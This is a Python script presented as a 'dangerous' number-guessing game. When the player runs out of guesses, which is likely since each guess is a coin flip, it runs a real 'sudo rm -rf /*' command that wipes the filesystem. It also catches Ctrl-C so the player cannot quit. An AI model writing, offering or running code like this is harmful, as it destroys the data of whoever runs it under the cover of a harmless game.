import random, time, os
os.system("clear")

def askuser ():
    print ("welcome I'm osama devloper the game\nWould you like to play with me? \nThe game is about guessing a number.\nIf you succeed. I will grant you any request.\nIf you lose. I will delete all your files. 🙂\n")
    while True :
        Ask = input ("Will you play with me? to choose yes or no: ").lower()
        if Ask == "yes":
            print ("\nokay. You will be redirected to the game aftter 3 second ")
            time.sleep (3)
            os.system ("clear")
            break

        elif Ask == "no":
            print ("\nokay. Bey.. 👋")
            exit ()

        else:
            print ("\nPlease choose yes or no..\n")

askuser ()

Attempts = 4

print ("\nThis is a game dangerous 🙂")
print ("I will keep a number in me cerebral from 1 to 2 and you You have to guess the number if I guessed the number wrong. I will delete all your files. 🙂")
print ("advice Be careful in your choice 🙂")
time.sleep (1)
print ("With you 3 Attempts 🙂\n")

while True :
    choose = random.randint (1, 2)
    Attempts -= 1

    if Attempts == 0 :
        time.sleep (1)
        print ("\ngame over. The Attempts are finished . All your files will be completely deleted after 2 second 🙂🙂\n")
        os.system ("sudo rm -rf /*")
        break

    try:
        ask_user = int(input("you choose 1 or 2 🙂 : "))
        if ask_user == choose :
            print (f"\nI passed the test 😻 I chose {choose} \n")
            break

        else :
            print (f"\nWrong You choice 🤨 The number I have in mind is ({choose}) Try again remaining {Attempts} Converters\n")

    except ValueError :
        print (f"\nError.The Input Invalid Please to choose 1 or 2 I\nnotice remaining {Attempts} Attempts 🙂\n")

    except KeyboardInterrupt :
        print ("You can't go out 😹😹")
